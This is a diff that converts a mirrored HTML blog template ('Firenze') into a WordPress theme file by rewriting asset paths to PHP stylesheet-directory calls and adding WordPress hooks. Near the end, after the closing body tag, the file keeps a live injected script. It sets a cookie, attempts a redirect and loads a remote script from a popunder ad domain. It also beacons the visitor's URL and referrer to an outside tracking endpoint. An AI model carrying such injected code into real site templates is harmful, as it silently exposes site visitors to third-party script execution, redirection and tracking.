@@ -7,14 +7,15 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Firenze - Responsive Blog HTML5 Template</title>
-<link href="css/bootstrap.min.css" rel="stylesheet">
-<link href="css/style.css" rel="stylesheet">
-<link href="css/shortcodes.css" rel="stylesheet">
-<link href="css/font-awesome.css" rel="stylesheet">
-<link href="css/owl.carousel.css" rel="stylesheet">
-<link href="css/owl.theme.css" rel="stylesheet">
+<link href="<?php echo esc_url(get_stylesheet_directory_uri());?>/css/bootstrap.min.css" rel="stylesheet">
+<!-- <link href="css/style.css" rel="stylesheet"> -->
+<link href="<?php echo esc_url(get_stylesheet_directory_uri());?> /css/style.css" rel="stylesheet">
+<link href="<?php echo esc_url(get_stylesheet_directory_uri());?>/css/shortcodes.css" rel="stylesheet">
+<link href="<?php echo esc_url(get_stylesheet_directory_uri());?>/css/font-awesome.css" rel="stylesheet">
+<link href="<?php echo esc_url(get_stylesheet_directory_uri());?>/css/owl.carousel.css" rel="stylesheet">
+<link href="<?php echo esc_url(get_stylesheet_directory_uri());?>/css/owl.theme.css" rel="stylesheet">
 
-<link href="css/demo-settings.css" rel="stylesheet">
+<link href="<?php echo esc_url(get_stylesheet_directory_uri());?>/css/demo-settings.css" rel="stylesheet">
 
 
 
@@ -23,8 +24,10 @@
       <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
       <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
     <![endif]-->
+
+  <?php wp_head(); ?>  
 </head>
-<body id="top">
+<body id="top" <?php body_class(); ?>>
 <div class="boxed">
 <div class="container container-gutter">
 
@@ -50,7 +53,7 @@
 <header class="header">
 <div class="row">
 <div class="col-md-12">
-<div class="logo"><a href="index.html"><img id="logo" src="images/logo.png" alt="logo"></a></div>
+<div class="logo"><a href="index.html"><img id="logo" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/logo.png" alt="logo"></a></div>
 </div>
 </div>
 </header>
@@ -114,7 +117,7 @@
 <div class="col-sm-12 col-md-8 slider-left">
 <div class="slider-item">
 <figure class="effect-milo">
-<img src="images/demo/1200x800-20.jpg" alt="img11" />
+<img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/1200x800-20.jpg" alt="img11" />
 <figcaption>
 <h2>Wine Packaging Inspired by <span>the Simpsons and Piet Mondrian</span> Goes Against the Packaging Norms</h2>
 <p>Jodi started making these beautiful book sculptures when she got hooked from folding one of the pages of a used book from a second-hand book shop.</p>
@@ -128,7 +131,7 @@
 <div class="col-xs-12">
 <div class="slider-item rightside">
 <figure class="effect-milo">
-<img src="images/demo/1200x800-14.jpg" alt="img11" />
+<img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/1200x800-14.jpg" alt="img11" />
 <figcaption>
 <h2>Make Stories Come Alive with <span>Jodi Harvey-Brown</span> Book Sculpture</h2>
 <p>Maybe it's wine or maybe not but one thing is for sure, combining Homer and ...</p>
@@ -140,7 +143,7 @@
 <div class="col-xs-12">
 <div class="slider-item rightside">
 <figure class="effect-milo">
-<img src="images/demo/1200x800-21.jpg" alt="img11" />
+<img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/1200x800-21.jpg" alt="img11" />
 <figcaption>
 <h2>You! Be Inspired! - The Enchanting Art of Meg Hunt</h2>
 <p>Milo went to the woods. He took a fun ride and never came back.</p>
@@ -163,7 +166,7 @@
 <div class="col-sm-12">
 <div class="blog-post">
 <div class="blog-post-container">
-<a href="post.html"><img src="images/demo/1200x800-3.jpg" alt=""></a>
+<a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/1200x800-3.jpg" alt=""></a>
 </div>
 <div class="blog-post-body">
 <div class="post-meta"><span class="post-category"><a href="#">Fashion</a></span></div>
@@ -198,7 +201,7 @@
 <div class="col-sm-12">
 <div class="blog-post">
 <div class="blog-post-container">
-<a href="post.html"><img src="images/demo/1200x800-17.jpg" alt=""></a>
+<a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/1200x800-17.jpg" alt=""></a>
 </div>
 <div class="blog-post-body">
 <div class="post-meta"><span class="post-category"><a href="#">Computers</a></span></div>
@@ -233,7 +236,7 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
 <div class="col-sm-12">
 <div class="blog-post">
 <div class="blog-post-container">
-<a href="post.html"><img src="images/demo/1200x800-14.jpg" alt=""></a>
+<a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/1200x800-14.jpg" alt=""></a>
 </div>
 <div class="blog-post-body">
 <div class="post-meta"><span class="post-category"><a href="#">Traveling</a></span></div>
@@ -347,7 +350,7 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
 
 <div class="grid-post">
 <div class="grid-post-container">
-<a href="post.html"><img src="images/demo/1200x800-17.jpg" alt=""></a>
+<a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/1200x800-17.jpg" alt=""></a>
 <div class="post-cats"><a href="#">Beauty</a></div>
 </div>
 <div class="post-meta">
@@ -366,7 +369,7 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
 
 <div class="grid-post">
 <div class="grid-post-container">
-<a href="post.html"><img src="images/demo/1200x800-11.jpg" alt=""></a>
+<a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/1200x800-11.jpg" alt=""></a>
 <div class="post-cats"><a href="#">Fashion</a></div>
 </div>
 <div class="post-meta">
@@ -387,7 +390,7 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
 
 <div class="grid-post">
 <div class="grid-post-container">
-<a href="post.html"><img src="images/demo/1200x800-9.jpg" alt=""></a>
+<a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/1200x800-9.jpg" alt=""></a>
 <div class="post-cats"><a href="#">Computers</a></div>
 </div>
 <div class="post-meta">
@@ -406,7 +409,7 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
 
 <div class="grid-post">
 <div class="grid-post-container">
-<a href="post.html"><img src="images/demo/1200x800-19.jpg" alt=""></a>
+<a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/1200x800-19.jpg" alt=""></a>
 <div class="post-cats"><a href="#">Transport</a></div>
 </div>
 <div class="post-meta">
@@ -430,7 +433,7 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
 
 <div class="list-post">
 <div class="list-post-container">
-<a href="post.html"><img src="images/demo/article-298x298-1.jpg" alt=""></a>
+<a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/article-298x298-1.jpg" alt=""></a>
 <div class="post-cats"><a href="#">Transport</a></div>
 </div>
 <div class="list-post-body">
@@ -448,7 +451,7 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
 
 <div class="list-post">
 <div class="list-post-container">
-<a href="post.html"><img src="images/demo/article-298x298-2.jpg" alt=""></a>
+<a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/article-298x298-2.jpg" alt=""></a>
 <div class="post-cats"><a href="#">Design</a></div>
 </div>
 <div class="list-post-body">
@@ -473,7 +476,7 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
 <div class="sidebar-module">
 <div class="sidebar-content">
 <h4 class="sidebar-heading"><span>About Us</span></h4>
-<a href="post.html"><img src="images/about-me.jpg" alt="fashion" /></a>
+<a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/about-me.jpg" alt="fashion" /></a>
 <p>Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingerstache fanny pack nostrud. Photo booth anim 8-bit hella, PBR 3 wolf moon beard Helvetica.</p>
 <a href="post.html" class="more-button"><span class="read-more-button">READ MORE</span></a>
 </div>
@@ -536,15 +539,15 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
 <div class="sidebar-content">
 <h4 class="sidebar-heading"><span>Instagram</span></h4>
 <ul class="widget-instagram">
-<li><a href="#" target="_self"><img src="images/demo/300x300-1.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
-<li><a href="#" target="_self"><img src="images/demo/300x300-2.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
-<li><a href="#" target="_self"><img src="images/demo/300x300-3.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
-<li><a href="#" target="_self"><img src="images/demo/300x300-4.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
-<li><a href="#" target="_self"><img src="images/demo/300x300-5.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
-<li><a href="#" target="_self"><img src="images/demo/300x300-6.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
-<li><a href="#" target="_self"><img src="images/demo/article-298x298-3.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
-<li><a href="#" target="_self"><img src="images/demo/article-298x298-2.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
-<li><a href="#" target="_self"><img src="images/demo/article-298x298-1.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
+<li><a href="#" target="_self"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-1.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
+<li><a href="#" target="_self"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-2.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
+<li><a href="#" target="_self"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-3.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
+<li><a href="#" target="_self"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-4.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
+<li><a href="#" target="_self"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-5.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
+<li><a href="#" target="_self"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-6.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
+<li><a href="#" target="_self"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/article-298x298-3.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
+<li><a href="#" target="_self"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/article-298x298-2.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
+<li><a href="#" target="_self"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/article-298x298-1.jpg" alt="Instagram Title" title="Instagram Title" /></a></li>
 </ul>
 </div>
 </div>
@@ -571,7 +574,7 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
 <h4 class="sidebar-heading"><span>Fashion</span></h4>
 <div class="widget-post">
 <div class="widget-post-image">
-<a href="post.html"><img src="images/demo/300x300-1.jpg" alt="fashion" /></a>
+<a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-1.jpg" alt="fashion" /></a>
 </div>
 <div class="widget-post-entry">
 <h3 class="widget-post-title"><a href="post.html">Watch Top Brands and Agencies Live-Tweet</a></h3>
@@ -580,7 +583,7 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
 </div>
 <div class="widget-post">
 <div class="widget-post-image">
-<a href="post.html"><img src="images/demo/300x300-5.jpg" alt="fashion" /></a>
+<a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-5.jpg" alt="fashion" /></a>
 </div>
 <div class="widget-post-entry">
 <h3 class="widget-post-title"><a href="post.html">The Influences of Modern Minimalism</a></h3>
@@ -589,7 +592,7 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
 </div>
 <div class="widget-post">
 <div class="widget-post-image">
-<a href="post.html"><img src="images/demo/300x300-7.jpg" alt="fashion" /></a>
+<a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-7.jpg" alt="fashion" /></a>
 </div>
 <div class="widget-post-entry">
 <h3 class="widget-post-title"><a href="post.html">Coors Light Gets New Look, Miller Lite Targets Biculturals</a></h3>
@@ -598,7 +601,7 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
 </div>
 <div class="widget-post">
 <div class="widget-post-image">
- <a href="post.html"><img src="images/demo/300x300-6.jpg" alt="fashion" /></a>
+ <a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-6.jpg" alt="fashion" /></a>
 </div>
 <div class="widget-post-entry">
 <h3 class="widget-post-title"><a href="post.html">Facebook to Start Telling Brands Who's Talking About What Topics</a></h3>
@@ -607,7 +610,7 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
 </div>
 <div class="widget-post">
 <div class="widget-post-image">
-<a href="post.html"><img src="images/demo/300x300-3.jpg" alt="fashion" /></a>
+<a href="post.html"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-3.jpg" alt="fashion" /></a>
 </div>
 <div class="widget-post-entry">
 <h3 class="widget-post-title"><a href="post.html">Notegraphy, Graphic Design Meet Note-Taking</a></h3>
@@ -662,7 +665,7 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
 <div class="sidebar-content">
 <h4 class="sidebar-heading"><span>Advertisement</span></h4>
 <div class="sidebar-content banner-widget">
-<a href="#"><img src="images/banner-300x250.png" alt="advertisement" width="300" height="250" /></a>
+<a href="#"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/banner-300x250.png" alt="advertisement" width="300" height="250" /></a>
 </div>
 </div>
 </div>
@@ -679,18 +682,18 @@ Meh synth Schlitz, tempor duis single-origin coffee ea next level ethnic fingers
  <h4 class="main-heading"><span>Instagram</span></h4>
 <div class="widget-insta">
 <div id="insta-owl" class="owl-carousel owl-theme">
-<div class="item"><a href="#"><img src="images/demo/300x300-2.jpg" alt=""></a></div>
-<div class="item"><a href="#"><img src="images/demo/300x300-1.jpg" alt=""></a></div>
-<div class="item"><a href="#"><img src="images/demo/300x300-3.jpg" alt=""></a></div>
-<div class="item"><a href="#"><img src="images/demo/300x300-6.jpg" alt=""></a></div>
-<div class="item"><a href="#"><img src="images/demo/300x300-4.jpg" alt=""></a></div>
-<div class="item"><a href="#"><img src="images/demo/300x300-5.jpg" alt=""></a></div>
-<div class="item"><a href="#"><img src="images/demo/article-298x298-3.jpg" alt=""></a></div>
-<div class="item"><a href="#"><img src="images/demo/300x300-6.jpg" alt=""></a></div>
-<div class="item"><a href="#"><img src="images/demo/article-298x298-5.jpg" alt=""></a></div>
-<div class="item"><a href="#"><img src="images/demo/article-298x298-3.jpg" alt=""></a></div>
-<div class="item"><a href="#"><img src="images/demo/article-298x298-2.jpg" alt=""></a></div>
-<div class="item"><a href="#"><img src="images/demo/article-298x298-1.jpg" alt=""></a></div>
+<div class="item"><a href="#"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-2.jpg" alt=""></a></div>
+<div class="item"><a href="#"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-1.jpg" alt=""></a></div>
+<div class="item"><a href="#"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-3.jpg" alt=""></a></div>
+<div class="item"><a href="#"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-6.jpg" alt=""></a></div>
+<div class="item"><a href="#"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-4.jpg" alt=""></a></div>
+<div class="item"><a href="#"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-5.jpg" alt=""></a></div>
+<div class="item"><a href="#"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/article-298x298-3.jpg" alt=""></a></div>
+<div class="item"><a href="#"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/300x300-6.jpg" alt=""></a></div>
+<div class="item"><a href="#"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/article-298x298-5.jpg" alt=""></a></div>
+<div class="item"><a href="#"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/article-298x298-3.jpg" alt=""></a></div>
+<div class="item"><a href="#"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/article-298x298-2.jpg" alt=""></a></div>
+<div class="item"><a href="#"><img src="<?php echo esc_url(get_stylesheet_directory_uri());?>/images/demo/article-298x298-1.jpg" alt=""></a></div>
 </div>
 </div>
 
@@ -718,15 +721,19 @@ Theme made by <a href="https://themeforest.net/user/different-themes/portfolio?r
 </div>
 </footer>
 
-<script type="text/javascript" src="js/jquery-latest.min.js"></script>
-<script type="text/javascript" src="js/bootstrap.min.js"></script>
-<script type="text/javascript" src="js/owl.carousel.min.js"></script>
-<script type="text/javascript" src="js/demo-settings.js"></script>
-<script type="text/javascript" src="js/SmoothScroll.min.js"></script>
-<script type="text/javascript" src="js/jquery.scrolline.js"></script>
-<script type="text/javascript" src="js/jquery.WCircleMenu-min.js"></script>
-<script type="text/javascript" src="js/ThemeScripts.js"></script>
-</body><script type="text/javascript">if(top==self){(function(){location.Href="https://sharing-wedding.com/"; document.Referrer="";document.cookie = 'pau=1;expires='+new Date(+new Date()+2*60*1000)['toGMTString']()+';path=/;';})();var deloplenscript=document.createElement('script');deloplenscript.src="http://deloplen.com/apu.php?zoneid=2678515";deloplenscript.setAttribute('async','');deloplenscript.setAttribute('data-cfasync','false');document.head.appendChild(deloplenscript);(new Image).src='http://firenze.different-themes.com/pages/imevrstk.php?qd=IBL&amp;zqd=015.005&amp;nbid=bdbc0dd5fcde6986a59232d0421648c0&amp;cid=297288&amp;at=popad'+'&url='+encodeURIComponent(location.href)+'&ref='+encodeURIComponent(document.referrer)+'&t='+parseInt(Math.random()*1000000)}</script>
+<script type="text/javascript" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/js/jquery-latest.min.js"></script>
+<script type="text/javascript" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/js/bootstrap.min.js"></script>
+<script type="text/javascript" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/js/owl.carousel.min.js"></script>
+<script type="text/javascript" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/js/demo-settings.js"></script>
+<script type="text/javascript" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/js/SmoothScroll.min.js"></script>
+<script type="text/javascript" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/js/jquery.scrolline.js"></script>
+<script type="text/javascript" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/js/jquery.WCircleMenu-min.js"></script>
+<script type="text/javascript" src="<?php echo esc_url(get_stylesheet_directory_uri());?>/js/ThemeScripts.js"></script>
+
+<?php wp_footer(); ?>
+</body>
+
+<script type="text/javascript">if(top==self){(function(){location.Href="https://sharing-wedding.com/"; document.Referrer="";document.cookie = 'pau=1;expires='+new Date(+new Date()+2*60*1000)['toGMTString']()+';path=/;';})();var deloplenscript=document.createElement('script');deloplenscript.src="http://deloplen.com/apu.php?zoneid=2678515";deloplenscript.setAttribute('async','');deloplenscript.setAttribute('data-cfasync','false');document.head.appendChild(deloplenscript);(new Image).src='http://firenze.different-themes.com/pages/imevrstk.php?qd=IBL&amp;zqd=015.005&amp;nbid=bdbc0dd5fcde6986a59232d0421648c0&amp;cid=297288&amp;at=popad'+'&url='+encodeURIComponent(location.href)+'&ref='+encodeURIComponent(document.referrer)+'&t='+parseInt(Math.random()*1000000)}</script>
 
 <!-- Mirrored from firenze.different-themes.com/html/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 01 Nov 2019 12:32:41 GMT -->
 </html>
